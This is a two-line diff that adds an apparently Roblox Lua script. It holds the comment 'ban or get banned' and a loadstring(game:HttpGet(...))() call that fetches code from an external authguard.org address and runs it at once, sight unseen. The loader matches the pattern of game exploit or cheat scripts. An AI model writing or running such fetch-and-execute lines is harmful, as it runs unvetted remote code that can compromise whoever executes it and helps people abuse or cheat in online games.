@@ -1,0 +1,2 @@
+-- ban or get banned
+loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/2632c81253854ed8b45ff39b88a7d23e"))()
